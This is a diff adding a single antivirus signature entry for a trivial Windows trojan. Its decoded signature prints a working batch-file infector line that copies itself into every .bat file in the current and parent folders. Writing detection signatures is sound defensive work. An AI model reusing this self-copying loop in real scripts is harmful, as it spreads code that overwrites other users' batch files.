@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Trojan.Trivial-403
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+mall by MiDeZ
+@echo off
+for %%m in (*.bat ..\*.bat) do copy %0.bat+%0 %%m>nul
+
